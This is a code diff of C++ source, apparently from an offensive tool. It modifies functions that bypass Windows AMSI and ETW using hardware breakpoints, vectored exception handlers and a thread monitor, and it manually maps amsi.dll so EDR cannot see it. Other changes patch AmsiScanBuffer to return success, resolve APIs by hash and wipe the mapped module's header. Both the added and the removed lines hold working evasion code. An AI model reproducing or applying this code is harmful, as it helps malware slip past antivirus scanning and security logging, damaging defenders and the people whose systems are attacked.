@@ -19,7 +19,7 @@ bool patchRemoteETW(HANDLE hProcess) {
     // 1. Get address of EtwEventWrite from local ntdll (it will be the same in remote)
     // You can use your syscallHandler or GetProcAddress since ntdll is already loaded
     unsigned char* k = helperHandler.getNtdll();
-    hProcess = GetCurrentProcess();
+   
     wchar_t wK[50];
     size_t convertedChars = 0;
 
@@ -48,50 +48,7 @@ bool patchRemoteETW(HANDLE hProcess) {
 
 std::vector<DWORD> patchedThreads;
 PVOID g_EtwAddr;
-void SetupEtwBypass() {
-    unsigned char* k = helperHandler.getNtdll();
 
-    wchar_t wK[50];
-    size_t convertedChars = 0;
-
-    mbstowcs_s(&convertedChars, wK, 50, (char*)k, _TRUNCATE);
-    g_EtwAddr = syscallHandler.getFunctionAddressByHash(wK, 615043106);
-    // 1. Register the VEH
-    AddVectoredExceptionHandler(1, EtwHwbpHandler);
-
-    
-    // 3. Get current thread context
-    CONTEXT ctx = { 0 };
-    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
-    GetThreadContext(GetCurrentThread(), &ctx);
-
-    // 4. Set the breakpoint in Dr0
-    ctx.Dr0 = (DWORD64)g_EtwAddr;
-    ctx.Dr7 |= (1 << 0); // Enable local breakpoint for Dr0
-    ctx.Dr7 &= ~(3 << 16); // Set as "Execute" breakpoint (bits 16-17 = 00)
-
-    // 5. Apply the context
-    SetThreadContext(GetCurrentThread(), &ctx);
-}
-
-LONG WINAPI EtwHwbpHandler(PEXCEPTION_POINTERS exceptions) {
-    if (exceptions->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
-        // Check if the RIP is at our target function (EtwEventWrite)
-        if (exceptions->ExceptionRecord->ExceptionAddress == g_EtwAddr) {
-
-            // 1. Get the return address from the stack (RSP points to it)
-            DWORD64 returnAddr = *(DWORD64*)(exceptions->ContextRecord->Rsp);
-
-            // 2. "Fake" a successful return
-            exceptions->ContextRecord->Rip = returnAddr; // Skip to the caller
-            exceptions->ContextRecord->Rsp += 8;         // Clean the stack
-            exceptions->ContextRecord->Rax = 0;          // Success (STATUS_SUCCESS)
-
-            return EXCEPTION_CONTINUE_EXECUTION;
-        }
-    }
-    return EXCEPTION_CONTINUE_SEARCH;
-}
 
 
 PVOID g_AmsiAddr;
@@ -102,66 +59,18 @@ HMODULE g_ManualAmsi = nullptr;
 PVOID g_pLdrLoadDll = nullptr;
 
 
-LONG WINAPI AmsiUniversalHwbpHandler(PEXCEPTION_POINTERS exceptions) {
-    if (exceptions->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
-
-        // --- INTERCEPT LDRLOADDLL ---
-        if (exceptions->ExceptionRecord->ExceptionAddress == g_pLdrLoadDll) {
-            PUNICODE_STRING pDllName = (PUNICODE_STRING)exceptions->ContextRecord->R8;
-            if (pDllName && pDllName->Buffer && wcsstr(pDllName->Buffer, L"amsi.dll")) {
-                *(PVOID*)exceptions->ContextRecord->R9 = (PVOID)g_ManualAmsi;
-
-                exceptions->ContextRecord->Rax = 0; // STATUS_SUCCESS
-                exceptions->ContextRecord->Rip = *(DWORD64*)(exceptions->ContextRecord->Rsp);
-                exceptions->ContextRecord->Rsp += 8;
-
-                // CRITICAL: Set RF (bit 16) to avoid re-triggering loop
-                exceptions->ContextRecord->EFlags |= 0x10000;
-                return EXCEPTION_CONTINUE_EXECUTION;
-            }
-        }
-
-        // --- INTERCEPT GETPROCADDRESS ---
-        if (exceptions->ExceptionRecord->ExceptionAddress == g_pGetProcAddress) {
-            HMODULE hMod = (HMODULE)exceptions->ContextRecord->Rcx;
-            if (hMod == g_ManualAmsi) {
-                // Return our patched AmsiScanBuffer for ANY request to this module
-                // This satisfies AmsiInitialize, AmsiOpenSession, etc.
-                PVOID targetFunc = syscallHandler.getFunctionAddressByHashWithModule(g_ManualAmsi, 704434574);
-
-                exceptions->ContextRecord->Rax = (DWORD64)targetFunc;
-                exceptions->ContextRecord->Rip = *(DWORD64*)(exceptions->ContextRecord->Rsp);
-                exceptions->ContextRecord->Rsp += 8;
-
-                // CRITICAL: Set RF (bit 16)
-                exceptions->ContextRecord->EFlags |= 0x10000;
-                return EXCEPTION_CONTINUE_EXECUTION;
-            }
-        }
-
-        // If we hit a single step we didn't handle, set RF and continue
-        exceptions->ContextRecord->EFlags |= 0x10000;
-        return EXCEPTION_CONTINUE_EXECUTION;
-    }
-    return EXCEPTION_CONTINUE_SEARCH;
-}
 
 
 
 
-HMODULE mapAmsi() {
-    auto rawAmsiBytes = ReadFileToBuffer("C:\\Windows\\System32\\amsi.dll");
-    BYTE* amsiBytes = rawAmsiBytes.data();
-    HMODULE amsiModule = LocalManualMap(amsiBytes);
-    std::cout << "Locally mapped amsi.dll at: " << amsiModule << "\n";
-	return amsiModule;
-}
 
 
 bool FullAmsiBypass() {
     // 1. Manually map amsi.dll into our process
     // This copy is invisible to the OS/EDR because it's not in the PEB
-    g_ManualAmsi = (HMODULE)LocalManualMap(ReadFileToBuffer("C:\\Windows\\System32\\amsi.dll").data());
+    std::vector<unsigned char> buff = ReadFileToBuffer("C:\\Windows\\System32\\amsi.dll");
+    std::cout << "amsi.dll size: " << buff.size() << "\n";
+    g_ManualAmsi = (HMODULE)LocalManualMap(buff.data());
     if(g_ManualAmsi == NULL) {
         std::cout << "Failed to manually map amsi.dll\n";
         return false;
@@ -183,9 +92,15 @@ bool FullAmsiBypass() {
     memcpy(localAmsiScanBuffer, patch, sizeof(patch));
     mainInjector.protectMemFlag(HANDLE(-1), localAmsiScanBuffer, PAGE_EXECUTE_READ, sizeof(patch));
 
+    BYTE* emptyBuffer = (BYTE*)malloc(1024 * 1024 * 20);
+
+    memset(emptyBuffer, 0, 1024 * 1024 * 20);
+    if (!WriteProcessMemory(HANDLE(-1), g_ManualAmsi, emptyBuffer, 0x1000, nullptr)) {
+        std::cout << "WARNING!: Can't clear HEADER\n";
+    }
     // 3. Set Hardware Breakpoint on LdrLoadDll
-    g_pLdrLoadDll = GetProcAddress(GetModuleHandleA("ntdll.dll"), "LdrLoadDll");
-    g_pGetProcAddress = GetProcAddress(GetModuleHandleA("kernel32.dll"), "GetProcAddress");
+    g_pLdrLoadDll = syscallHandler.getFunctionAddressByHash(L"ntdll.dll", 50846499);
+    g_pGetProcAddress = syscallHandler.getFunctionAddressByHash(L"kernel32.dll", 3476142879);
     if (g_pGetProcAddress == NULL || g_pLdrLoadDll == NULL) {
         std::cout << "Failed to get address for LdrLoadDll or GetProcAddress\n";
         return false;
@@ -196,7 +111,7 @@ bool FullAmsiBypass() {
 
     CONTEXT ctx = { 0 };
     ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
-    GetThreadContext(GetCurrentThread(), &ctx);
+    apcInjector.myThreadContext(GetCurrentThread(), &ctx);
 
     // Dr0 for the Loader
     ctx.Dr0 = (DWORD64)g_pLdrLoadDll;
@@ -212,12 +127,7 @@ bool FullAmsiBypass() {
     //SetThreadContext(GetCurrentThread(), &ctx);
 
     std::cout << "[+] Stealth AMSI Redirect Active. ntdll bytes remain untouched.\n";
-    FARPROC test = GetProcAddress(g_ManualAmsi, "AmsiScanBuffer");
-	std::cout << "Testing GetProcAddress on manual map for AmsiScanBuffer: " << test << "\n";
-    if (test == NULL) {
-        std::cout << "CRITICAL: GetProcAddress cannot find exports in manual map!\n";
-		return false;
-    }
+    
     return true;
 }
 
@@ -326,7 +236,7 @@ bool FullEtwBypass() {
     // current context for dr0 and dr1
     CONTEXT ctx = { 0 };
     ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
-    GetThreadContext(GetCurrentThread(), &ctx);
+    apcInjector.myThreadContext(GetCurrentThread(), &ctx);
 
     // ETW hooks on dr2 and Dr3
     ctx.Dr2 = (DWORD64)g_pNtCreateThreadEx;
@@ -348,131 +258,3 @@ bool FullEtwBypass() {
 
 
 
-bool AmsiPatchGivenModule(HMODULE amsi, DWORD hash ) {
-	HANDLE localProcess = GetCurrentProcess();
-    PVOID amsiScanBuff = syscallHandler.getFunctionAddressByHashWithModule(amsi, hash);
-    unsigned char patch[] = { 0x31, 0xC0, 0xC3 }; // xor eax, eax; ret
-    SIZE_T patchSize = sizeof(patch);
-
-    std::cout << "[!] Patching AmsiScanBuffer at: " << amsiScanBuff << std::endl;
-
-    // Change protection to RW
-    mainInjector.protectMemFlag(localProcess, amsiScanBuff, PAGE_READWRITE, patchSize);
-
-    //Write the patch
-    mainInjector.wrMem(localProcess, amsiScanBuff, (LPVOID)patch, patchSize);
-
-    //Restore protection to RX
-    mainInjector.protectMemFlag(localProcess, amsiScanBuff, PAGE_EXECUTE_READ, patchSize);
-    std::cout << "[+] Amsi silenced in given module" << std::endl;
-    return 0;
-}
-void SetupAMSIBypass() {
-	
-
-
-    HMODULE amsiModule = LoadLibraryW(L"amsi.dll");
-    
-    g_AmsiAddr = syscallHandler.getFunctionAddressByHashWithModule(amsiModule, 704434574);
-	std::cout << "AmsiScanBuffer address: " << g_AmsiAddr << "\n";
-    // 1. Register the VEH
-    AddVectoredExceptionHandler(1, AmsiHwbpHandler);
-    patchedThreads.push_back(GetCurrentThreadId());
-
-    // 3. Get current thread context
-    CONTEXT ctx = { 0 };
-    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
-    GetThreadContext(GetCurrentThread(), &ctx);
-
-    // 4. Set the breakpoint in Dr0
-    ctx.Dr0 = (DWORD64)g_AmsiAddr;
-    ctx.Dr7 |= (1 << 0); // Enable local breakpoint for Dr0
-    ctx.Dr7 &= ~(3 << 16); // Set as "Execute" breakpoint (bits 16-17 = 00)
-
-    // 5. Apply the context
-    SetThreadContext(GetCurrentThread(), &ctx);
-    std::thread(MonitorThreads).detach();
-
-}
-LONG WINAPI AmsiHwbpHandler(PEXCEPTION_POINTERS exceptions) {
-    if (exceptions->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
-        // Check if the RIP is at our target function (EtwEventWrite)
-        if (exceptions->ExceptionRecord->ExceptionAddress == g_AmsiAddr) {
-
-            // 1. Get the return address from the stack (RSP points to it)
-            DWORD64 returnAddr = *(DWORD64*)(exceptions->ContextRecord->Rsp);
-
-            // 2. "Fake" a successful return
-            exceptions->ContextRecord->Rip = returnAddr; // Skip to the caller
-            exceptions->ContextRecord->Rsp += 8;         // Clean the stack
-            exceptions->ContextRecord->Rax = 0;          // Success (STATUS_SUCCESS)
-
-            return EXCEPTION_CONTINUE_EXECUTION;
-        }
-    }
-    return EXCEPTION_CONTINUE_SEARCH;
-};
-
-
-
-void ApplyHwBpToThread(DWORD tid) {
-    HANDLE hThread = OpenThread(
-        THREAD_SUSPEND_RESUME |
-        THREAD_GET_CONTEXT |
-        THREAD_SET_CONTEXT,
-        FALSE,
-        tid
-    );
-
-    if (!hThread) return;
-
-    SuspendThread(hThread);
-
-    CONTEXT ctx = { 0 };
-    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
-
-    if (GetThreadContext(hThread, &ctx)) {
-        ctx.Dr0 = (DWORD64)g_EtwAddr;
-        ctx.Dr7 |= 1;
-        ctx.Dr7 &= ~(3 << 16);
-
-        SetThreadContext(hThread, &ctx);
-    }
-
-    ResumeThread(hThread);
-    CloseHandle(hThread);
-}
-
-
-
-
-
-
-void MonitorThreads() {
-    while (true) {
-        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
-        if (snap == INVALID_HANDLE_VALUE) continue;
-
-        THREADENTRY32 te;
-        te.dwSize = sizeof(te);
-
-        if (Thread32First(snap, &te)) {
-            do {
-                if (te.th32OwnerProcessID == GetCurrentProcessId()) {
-
-                    // Check if TID is already in our vector
-                    auto it = std::find(patchedThreads.begin(), patchedThreads.end(), te.th32ThreadID);
-
-                    // If it points to end, it's a new thread
-                    if (it == patchedThreads.end()) {
-                        ApplyHwBpToThread(te.th32ThreadID);
-                        patchedThreads.push_back(te.th32ThreadID);
-                    }
-                }
-            } while (Thread32Next(snap, &te));
-        }
-
-        CloseHandle(snap);
-        Sleep(10);
-    }
-}
